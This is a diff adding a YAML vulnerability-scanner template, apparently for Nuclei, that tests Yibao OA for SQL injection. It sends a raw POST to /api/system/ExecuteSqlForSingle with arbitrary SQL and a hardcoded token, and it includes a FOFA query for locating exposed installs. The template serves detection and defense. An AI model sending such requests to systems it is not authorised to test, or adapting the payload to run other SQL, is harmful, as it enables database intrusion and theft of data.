@@ -1,0 +1,38 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - data":"{{md5({{num}})}}
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /api/system/ExecuteSqlForSingle HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{num}}'')),3,32)&strParameters
+
+    '
+id: yibao-sqli
+info:
+  author: DhiyaneshDK
+  description: Yibao OA System is vulnerable to SQL Injection.
+  metadata:
+    fofa-query: "product=\"\u9876\u8BAF\u79D1\u6280-\u6613\u5B9DOA\u7CFB\u7EDF\""
+    max-request: 1
+    verified: true
+  name: Yibao OA System - SQL Injection
+  severity: high
+  tags: yiboo,oa,sqli
+variables:
+  num: '999999999'
